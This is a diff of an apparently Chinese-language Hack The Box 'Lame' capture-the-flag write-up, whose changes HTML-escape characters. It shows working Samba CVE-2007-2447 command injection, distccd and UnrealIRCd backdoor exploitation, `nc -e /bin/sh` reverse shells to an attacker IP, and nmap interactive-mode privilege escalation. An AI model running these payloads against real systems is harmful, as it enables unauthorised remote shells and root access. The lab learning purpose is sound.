@@ -1,7 +1,7 @@
 # HTB靶机 Lame WriteUp
 
 
-<!--more-->
+&lt;!--more--&gt;
 
 # Lame
 
@@ -9,11 +9,11 @@
 
 简介：
 
-> Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement
+&gt; Lame is a beginner level machine, requiring only one exploit to obtain root access. It was the first machine published on Hack The Box and was often the first machine for new users prior to its retirement
 
 Tags：
 
-> Injection,  CMS Exploit,  Linux,  Web,  PHP,  Password Reuse
+&gt; Injection,  CMS Exploit,  Linux,  Web,  PHP,  Password Reuse
 
 Rating: 4.4
 
@@ -81,13 +81,13 @@ Skills：
  230 Login successful.
  Remote system type is UNIX.
  Using binary mode to transfer files.
- ftp> ls
+ ftp&gt; ls
  200 PORT command successful. Consider using PASV.
  150 Here comes the directory listing.
  226 Directory send OK.
- ftp> pwd
- 257 "/"
- ftp> bye
+ ftp&gt; pwd
+ 257 &#34;/&#34;
+ ftp&gt; bye
  421 Timeout.
 ```
 
@@ -121,21 +121,21 @@ Skills：
 ### MSF
 
 ```shell
- msf6 > search samba
- msf6 > use exploit/multi/samba/usermap_script
+ msf6 &gt; search samba
+ msf6 &gt; use exploit/multi/samba/usermap_script
  [*] No payload configured, defaulting to cmd/unix/reverse_netcat
- msf6 exploit(multi/samba/usermap_script) > set rhosts 10.10.10.3
- rhosts => 10.10.10.3
- msf6 exploit(multi/samba/usermap_script) > set lhost 10.10.14.2
- lhost => 10.10.14.2
- msf6 exploit(multi/samba/usermap_script) > run
+ msf6 exploit(multi/samba/usermap_script) &gt; set rhosts 10.10.10.3
+ rhosts =&gt; 10.10.10.3
+ msf6 exploit(multi/samba/usermap_script) &gt; set lhost 10.10.14.2
+ lhost =&gt; 10.10.14.2
+ msf6 exploit(multi/samba/usermap_script) &gt; run
  
  [*] Started reverse TCP handler on 10.10.14.2:4444 
- [*] Command shell session 1 opened (10.10.14.2:4444 -> 10.10.10.3:32875 ) at 2022-03-16 16:04:23 +0800
+ [*] Command shell session 1 opened (10.10.14.2:4444 -&gt; 10.10.10.3:32875 ) at 2022-03-16 16:04:23 &#43;0800
  
  whoami
  root
- find / -name "user.txt"
+ find / -name &#34;user.txt&#34;
  /home/makis/user.txt
  cat /home/makis/user.txt
  83bb7c7fff163562d48ac4ba14316025
@@ -180,7 +180,7 @@ Skills：
  protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
                                                                                                                                                   
  ┌──(xavier㉿xavier)-[~]
- └─$ smbclient -L 10.10.10.3 -U "" -N --option='client min protocol=nt1'
+ └─$ smbclient -L 10.10.10.3 -U &#34;&#34; -N --option=&#39;client min protocol=nt1&#39;
  
         Sharename       Type     Comment
          ---------       ----      -------
@@ -208,7 +208,7 @@ smbclient从4.11开始协议取消了nt1,使用smbv2,所以导致协议不能协
 **crackmapexec 探测**
 
 ```shell
- $ crackmapexec smb --shares 10.10.10.3 -u '' -p ''                
+ $ crackmapexec smb --shares 10.10.10.3 -u &#39;&#39; -p &#39;&#39;                
  [*] First time use detected                                        
  [*] Creating home directory structure                               
  [*] Creating default workspace                                      
@@ -220,8 +220,8 @@ smbclient从4.11开始协议取消了nt1,使用smbv2,所以导致协议不能协
  [*] Copying default configuration file                              
  [*] Generating SSL certificate                                     
  SMB         10.10.10.3      445   LAME             [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)                     
- SMB         10.10.10.3      445   LAME             [+] hackthebox.gr\:  
- SMB         10.10.10.3      445   LAME             [+] Enumerated shares 
+ SMB         10.10.10.3      445   LAME             [&#43;] hackthebox.gr\:  
+ SMB         10.10.10.3      445   LAME             [&#43;] Enumerated shares 
  SMB         10.10.10.3      445   LAME             Share           Permissions     Remark                                                       
  SMB         10.10.10.3      445   LAME             -----           -----------     ------                                                       
  SMB         10.10.10.3      445   LAME             print$                         Printer Drivers                                              
@@ -241,28 +241,28 @@ $ searchsploit samba 3.0.20
  -------------------------------------------------------------------------------------------------------------------------
   Exploit Title                                                                         | Path                           
  -------------------------------------------------------------------------------------------------------------------------
- Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                 | multiple/remote/10095.txt
- Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)       | unix/remote/16320.rb
- Samba < 3.0.20 - Remote Heap Overflow                                                   | linux/remote/7701.txt
- Samba < 3.0.20 - Remote Heap Overflow                                                   | linux/remote/7701.txt
- Samba < 3.6.2 (x86) - Denial of Service (PoC)                                           | linux_x86/dos/36741.py
+ Samba 3.0.10 &lt; 3.3.5 - Format String / Security Bypass                                 | multiple/remote/10095.txt
+ Samba 3.0.20 &lt; 3.0.25rc3 - &#39;Username&#39; map script&#39; Command Execution (Metasploit)       | unix/remote/16320.rb
+ Samba &lt; 3.0.20 - Remote Heap Overflow                                                   | linux/remote/7701.txt
+ Samba &lt; 3.0.20 - Remote Heap Overflow                                                   | linux/remote/7701.txt
+ Samba &lt; 3.6.2 (x86) - Denial of Service (PoC)                                           | linux_x86/dos/36741.py
  -------------------------------------------------------------------------------------------------------------------------
  Shellcodes: No Results
  
  $ more /usr/share/exploitdb/exploits/unix/remote/16320.rb
  ......
-                         'Author'         => [ 'jduck' ],
-                         'License'        => MSF_LICENSE,
-                         'Version'        => '$Revision: 10040 $',
-                         'References'     =>
+                         &#39;Author&#39;         =&gt; [ &#39;jduck&#39; ],
+                         &#39;License&#39;        =&gt; MSF_LICENSE,
+                         &#39;Version&#39;        =&gt; &#39;$Revision: 10040 $&#39;,
+                         &#39;References&#39;     =&gt;
                                 [ 
-                                        [ 'CVE', '2007-2447' ],
-                                        [ 'OSVDB', '34700' ],
-                                        [ 'BID', '23972' ],
-                                        [ 'URL', 'http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534' ],
-                                        [ 'URL', 'http://samba.org/samba/security/CVE-2007-2447.html' ]
+                                        [ &#39;CVE&#39;, &#39;2007-2447&#39; ],
+                                        [ &#39;OSVDB&#39;, &#39;34700&#39; ],
+                                        [ &#39;BID&#39;, &#39;23972&#39; ],
+                                        [ &#39;URL&#39;, &#39;http://labs.idefense.com/intelligence/vulnerabilities/display.php?id=534&#39; ],
+                                        [ &#39;URL&#39;, &#39;http://samba.org/samba/security/CVE-2007-2447.html&#39; ]
                                 ],
-                         'Platform'       => ['unix'],
+                         &#39;Platform&#39;       =&gt; [&#39;unix&#39;],
  
 ```
 
@@ -277,14 +277,14 @@ Github找利用脚本
 ```shell
  $ python3 usermap_script.py 
  [*] CVE-2007-2447 - Samba usermap script
- [-] usage: python usermap_script.py <RHOST> <RPORT> <LHOST> <LPORT>
+ [-] usage: python usermap_script.py &lt;RHOST&gt; &lt;RPORT&gt; &lt;LHOST&gt; &lt;LPORT&gt;
  
  $ nc -l -v -p 4444 
  
  $ python3 usermap_script.py 10.10.10.3 139 10.10.14.2 4444
  [*] CVE-2007-2447 - Samba usermap script
- [+] Connecting !
- [+] Payload was sent - check netcat !
+ [&#43;] Connecting !
+ [&#43;] Payload was sent - check netcat !
  
  $ nc -l -v -p 4444   
  listening on [any] 4444 ...
@@ -294,7 +294,7 @@ Github找利用脚本
  root
  whereis python
  python: /usr/bin/python2.5-config /usr/bin/python /usr/bin/python2.5 /etc/python /etc/python2.5 /usr/lib/python2.3 /usr/lib/python2.5 /usr/lib/python2.4 /usr/local/lib/python2.5 /usr/include/python2.5 /usr/share/python /usr/share/man/man1/python.1.gz
- python -c 'import pty;pty.spawn("/bin/bash")'
+ python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;
  root@lame:/# find / -name user.txt
  find / -name user.txt
  /home/makis/user.txt
@@ -314,13 +314,13 @@ Github找利用脚本
 `more /usr/share/exploitdb/exploits/unix/remote/16320.rb` 分析漏洞利用脚本，发现name 字段为
 
 ```ruby
- "/=`nohup " + payload.encoded + "`"
+ &#34;/=`nohup &#34; &#43; payload.encoded &#43; &#34;`&#34;
 ```
 
 
 
 ```shell
- $ crackmapexec smb --shares 10.10.10.3 -u './=`nohup nc -e /bin/sh 10.10.14.2 4445`' -p ''                                           
+ $ crackmapexec smb --shares 10.10.10.3 -u &#39;./=`nohup nc -e /bin/sh 10.10.14.2 4445`&#39; -p &#39;&#39;                                           
  SMB         10.10.10.3     445   LAME             [*] Unix (name:LAME) (domain:hackthebox.gr) (signing:False) (SMBv1:True)
 ```
 
@@ -408,7 +408,7 @@ nmap 做细分扫描，扫特定端口的服务详情，并用上NSE
 
 网上查distccd的资料：
 
-> *distccd* is the server for the ***distcc**(1)* distributed compiler. It accepts and runs compilation jobs for network clients.
+&gt; *distccd* is the server for the ***distcc**(1)* distributed compiler. It accepts and runs compilation jobs for network clients.
 
 `more /usr/share/nmap/scripts/distcc-cve2004-2687.nse`查看NSE脚本的具体内容：
 
@@ -423,20 +423,20 @@ nmap 做细分扫描，扫特定端口的服务详情，并用上NSE
  
  ---
  -- @usage
- -- nmap -p 3632 <ip> --script distcc-exec --script-args="distcc-exec.cmd='id'"
+ -- nmap -p 3632 &lt;ip&gt; --script distcc-exec --script-args=&#34;distcc-exec.cmd=&#39;id&#39;&#34;
  ...
 ```
 
 可以看到`distcc-exec.cmd`参数即为所执行的命令，将其改为连接命令，如`nc -e /bin/bash 10.10.14.2 4444`，
 
-用`nmap -p 3632 <ip> --script distcc-exec --script-args="distcc-exec.cmd='id'"`这种方法出现了很多意料之外的问题，无法成功获得shell。排查中...
+用`nmap -p 3632 &lt;ip&gt; --script distcc-exec --script-args=&#34;distcc-exec.cmd=&#39;id&#39;&#34;`这种方法出现了很多意料之外的问题，无法成功获得shell。排查中...
 
 ```shell
  NSE: failed to initialize the script engine: 
- /usr/bin/../share/nmap/nse_main.lua:822: 'distcc-exec' did not match a category, filename, or directory
+ /usr/bin/../share/nmap/nse_main.lua:822: &#39;distcc-exec&#39; did not match a category, filename, or directory
  stack traceback:
-        [C]: in function 'error'
-        /usr/bin/../share/nmap/nse_main.lua:822: in local 'get_chosen_scripts'         
+        [C]: in function &#39;error&#39;
+        /usr/bin/../share/nmap/nse_main.lua:822: in local &#39;get_chosen_scripts&#39;         
         /usr/bin/../share/nmap/nse_main.lua:1322: in main chunk 
         [C]: in ?                                                           
          
@@ -446,7 +446,7 @@ nmap 做细分扫描，扫特定端口的服务详情，并用上NSE
 排查结果出来了，虽然用法中写着distcc-exec，但nmap其实并无法识别，只能用全名，对应的后面也需要修改。改成如下后，可成功执行
 
 ```shell
- $ sudo nmap -p3632 10.10.10.3 --script=distcc-cve2004-2687.nse --script-args="distcc-cve2004-2687.cmd='nc -e /bin/bash 10.10.14.2 4444'"
+ $ sudo nmap -p3632 10.10.10.3 --script=distcc-cve2004-2687.nse --script-args=&#34;distcc-cve2004-2687.cmd=&#39;nc -e /bin/bash 10.10.14.2 4444&#39;&#34;
  
  $ nc -lvnp 4444
  listening on [any] 4444 ...
@@ -466,9 +466,9 @@ nmap 做细分扫描，扫特定端口的服务详情，并用上NSE
  connect to [10.10.14.2] from (UNKNOWN) [10.10.10.3] 42558
  whoami
  daemon
- python -c "import pty;pty.spawn('/bin/bash')"    
- daemon@lame:/tmp$ find / -type f -perm -u=s 2>/dev/null
- find / -type f -perm -u=s 2>/dev/null
+ python -c &#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;    
+ daemon@lame:/tmp$ find / -type f -perm -u=s 2&gt;/dev/null
+ find / -type f -perm -u=s 2&gt;/dev/null
  /bin/umount
  /bin/fusermount
  /bin/su
@@ -509,17 +509,17 @@ nmap 做细分扫描，扫特定端口的服务详情，并用上NSE
 
 发现有nmap，版本为4.53，可以利用进行提权
 
-> nmap 在 2.02 到 5.21 版本中可用交互模式（--interactive）执行 shell 命令
->
-> The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
+&gt; nmap 在 2.02 到 5.21 版本中可用交互模式（--interactive）执行 shell 命令
+&gt;
+&gt; The interactive mode, available on versions 2.02 to 5.21, can be used to execute shell commands.
 
 ```
  daemon@lame:/tmp$ nmap --interactive
  nmap --interactive
  
  Starting Nmap V. 4.53 ( http://insecure.org )
- Welcome to Interactive Mode -- press h <enter> for help
- nmap> !sh
+ Welcome to Interactive Mode -- press h &lt;enter&gt; for help
+ nmap&gt; !sh
  !sh
  sh-3.2# whoami
  whoami
@@ -534,16 +534,16 @@ nmap 做细分扫描，扫特定端口的服务详情，并用上NSE
 ```shell
  daemon@lame:/tmp$ cat /root/.ssh/authorized_keys
  cat /root/.ssh/authorized_keys
- ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh+WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U+qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE+kcP+Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc+Wv8Vw7bwkf+1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
+ ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEApmGJFZNl0ibMNALQx7M6sGGoi4KNmj6PVxpbpG70lShHQqldJkcteZZdPFSbW76IUiPR0Oh&#43;WBV0x1c6iPL/0zUYFHyFKAz1e6/5teoweG1jr2qOffdomVhvXXvSjGaSFwwOYB8R0QxsOWWTQTYSeBa66X6e777GVkHCDLYgZSo8wWr5JXln/Tw7XotowHr8FEGvw2zW1krU3Zo9Bzp0e0ac2U&#43;qUGIzIu/WwgztLZs5/D9IyhtRWocyQPE&#43;kcP&#43;Jz2mt4y1uA73KqoXfdw5oGUkxdFo9f1nu2OwkjOc&#43;Wv8Vw7bwkf&#43;1RgiOMgiJ5cCs4WocyVxsXovcNnbALTp3w== msfadmin@metasploitable
 ```
 
 看到msfadmin@metasploitable，最初以为是其他攻击方式留下的，重置主机后发现还是存在，说明是个线索，但是我不知道是什么。参考文章2告诉我是 `CVE-2008-0166` 的线索，没了解过，`$ searchsploit cve-2008-0166` 无过，上网搜。
 
-> OpenSSL 0.9.8c-1 up to versions before 0.9.8g-9 on Debian-based operating systems uses a random number generator that generates predictable numbers, which makes it easier for remote attackers to conduct brute force guessing attacks against cryptographic keys.
->
-> ——https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166
->
-> 翻译：基于 Debian 的操作系统上的 OpenSSL 0.9.8c-1 到 0.9.8g-9 之前的版本使用随机数生成器生成可预测的数字，这使得远程攻击者更容易对加密密钥进行暴力猜测攻击。
+&gt; OpenSSL 0.9.8c-1 up to versions before 0.9.8g-9 on Debian-based operating systems uses a random number generator that generates predictable numbers, which makes it easier for remote attackers to conduct brute force guessing attacks against cryptographic keys.
+&gt;
+&gt; ——https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-0166
+&gt;
+&gt; 翻译：基于 Debian 的操作系统上的 OpenSSL 0.9.8c-1 到 0.9.8g-9 之前的版本使用随机数生成器生成可预测的数字，这使得远程攻击者更容易对加密密钥进行暴力猜测攻击。
 
 expdb搜索：https://www.exploit-db.com/search?cve=2008-0166
 
@@ -589,17 +589,17 @@ expdb搜索：https://www.exploit-db.com/search?cve=2008-0166
  aemon@lame:/tmp$ nc 127.0.0.1 6697
  nc 127.0.0.1 6697
  :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
- :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+ :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn&#39;t resolve your hostname; using your IP address instead
  ERROR :Closing Link: [127.0.0.1] (Ping timeout)
 ```
 
 得到 Metasploitable 的输出，这表明我们在正确的方向。为了方便使用后门，我们可以使用已知的connect-back shell方法。
 
 ```shell
- daemon@lame:/tmp$ echo "AB; nc -e /bin/sh 10.10.14.2 5555" | nc 127.0.0.1 6697         
- echo "AB; nc -e /bin/sh 10.10.14.2 5555" | nc 127.0.0.1 6697
+ daemon@lame:/tmp$ echo &#34;AB; nc -e /bin/sh 10.10.14.2 5555&#34; | nc 127.0.0.1 6697         
+ echo &#34;AB; nc -e /bin/sh 10.10.14.2 5555&#34; | nc 127.0.0.1 6697
  :irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
- :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
+ :irc.Metasploitable.LAN NOTICE AUTH :*** Couldn&#39;t resolve your hostname; using your IP address instead
 ```
 
 另一边
@@ -618,7 +618,7 @@ expdb搜索：https://www.exploit-db.com/search?cve=2008-0166
 
 ## 他山之石
 
-- https://hackpentest.in/hackthebox-lame/  使用了python获取一个完整的tty SHELL `python -c 'import pty;pty.spawn("/bin/bash")'`，同时提供了非MSF思路。
+- https://hackpentest.in/hackthebox-lame/  使用了python获取一个完整的tty SHELL `python -c &#39;import pty;pty.spawn(&#34;/bin/bash&#34;)&#39;`，同时提供了非MSF思路。
 - https://coldfusionx.github.io/posts/LameHTB/  使用了crackmapexec ， 根据现有exp自己复现了利用代码；distccd的攻击思路、提权思路
 
 
